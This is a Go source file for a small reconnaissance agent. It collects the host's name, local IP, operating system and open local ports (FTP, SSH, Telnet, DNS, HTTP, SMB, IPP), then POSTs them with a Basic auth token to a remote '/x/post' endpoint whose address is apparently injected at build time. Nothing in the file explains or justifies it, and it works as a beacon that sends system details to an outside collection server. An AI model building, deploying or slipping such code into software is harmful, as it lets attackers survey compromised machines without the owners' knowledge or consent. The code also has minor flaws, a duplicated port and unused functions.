package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"runtime"
	"time"
)

type network struct {
	Hostname string `json:"host"`
	IP       string `json:"ip"`
	Nmap     []int  `json:"nmap"`
	OS       string `json:"os"`
}

var address string
var data string

func main() {
	h, err := os.Hostname()
	if err != nil {
		h = "n/a"
	}
	i, err := getIP()
	if err != nil {
		i = "n/a"
	}
	p := getPorts()
	o := runtime.GOOS
	networks := &network{
		Hostname: h,
		IP:       i,
		Nmap:     p,
		OS:       o,
	}
	pload, _ := json.Marshal(networks)
	req, _ := http.NewRequest("POST", "http://"+address+"/x/post", bytes.NewBuffer(pload))
	token := fmt.Sprintf("Basic %s", data)
	req.Header.Add("Authorization", token)
	http.DefaultClient.Do(req)
}

func getIP() (string, error) {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "", err
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String(), nil
}

func getHostname() (string, error) {
	name, err := os.Hostname()
	if err != nil {
		return "", err
	}
	return name, nil
}

func getPorts() []int {
	validPorts := []int{}
	invalidPorts := []int{}
	for _, port := range []int{21, 22, 23, 53, 80, 445, 445, 631} {
		addrs := fmt.Sprintf("%s:%d", "localhost", port)
		conn, err := net.DialTimeout("tcp", addrs, 5*time.Second)
		if err != nil {
			invalidPorts = append(invalidPorts, port)
		} else {
			validPorts = append(validPorts, port)
			conn.Close()
		}
	}
	return validPorts
}
